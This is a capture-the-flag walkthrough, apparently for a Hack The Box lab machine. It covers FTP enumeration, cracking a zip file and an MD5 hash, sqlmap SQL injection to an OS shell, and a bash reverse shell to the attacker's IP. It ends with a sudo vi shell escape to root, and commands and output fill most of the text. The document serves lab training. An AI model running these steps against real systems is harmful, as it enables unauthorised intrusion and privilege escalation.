# 1- Enumeration
## Nmap
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.82
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0ee58077534b00b9165b259569527a4 (RSA)
|   256 ac6e81188922d7a7417d814f1bb8b251 (ECDSA)
|_  256 425bc321dfefa20bc95e03421d69d028 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

## Gobuster


# 2- Exploitation
# ftp connexion
ftp> ls
229 Entering Extended Passive Mode (|||10726|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip

## Extract zip file
┌──(root㉿kali)-[~]
└─# zip2john backup.zip > zip.txt
┌──(root㉿kali)-[~]
└─# john zip.txt --wordlist=/usr/share/wordlists/rockyou.txt
741852963        (backup.zip)

┌──(root㉿kali)-[~]
└─# ls
backup.zip  index.php  style.css

## Find
┌──(root㉿kali)-[~]
└─# cat index.php 
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
creds = admin:2cb42f8734ea607eefed3b70af13bbd3
## Crack md5 hash
#crackPass 
┌──(root㉿kali)-[/home/kali/Desktop/vacine]
└─# echo "2cb42f8734ea607eefed3b70af13bbd3" > md5
┌──(root㉿kali)-[/home/kali/Desktop/vacine]
└─# john md5 -wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5    
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
[qwerty789]        (?) 

## Creds = admin:qwerty789

┌──(root㉿kali)-[~]
└─# sqlmap -u 'http://htb/dashboard.php?search=any+query' --cookie="PHPSESSID=383oqquk0pj0o982b0juqhiuel" --os-shell
os-shell> bash -c 'bash -i >& /dev/tcp/10.10.16.82/1234 0>&1'

# Foothold
[postgres@vaccine:/var/lib/postgresql$] cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7

## Find 
[postgres@vaccine:/var/www/html$] cat dashboard.php
	$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");

# PrivEsc
┌──(root㉿kali)-[~]
└─# ssh postgres@htb
[postgres@vaccine:/var/lib$] sudo -l
[sudo] password for postgres: 
	Matching Defaults entries for postgres on vaccine:
	    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
	    XFILESEARCHPATH XUSERFILESEARCHPATH",
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
	    mail_badpass
	
	User postgres may run the following commands on vaccine:
	    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

[postgres@vaccine:/var/lib$] sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
In Vi : #ExploitVi
	:set shell=/bin/sh 
	:shell
~~~
	# id
	uid=0(root) gid=0(root) groups=0(root)
	
	# cd
	# ls
	pg_hba.conf  root.txt  snap
	# cat root
	cat: root: No such file or directory
	# cat root.txt
	dd6e058e814260bc70e9bbdef2715849
~~~
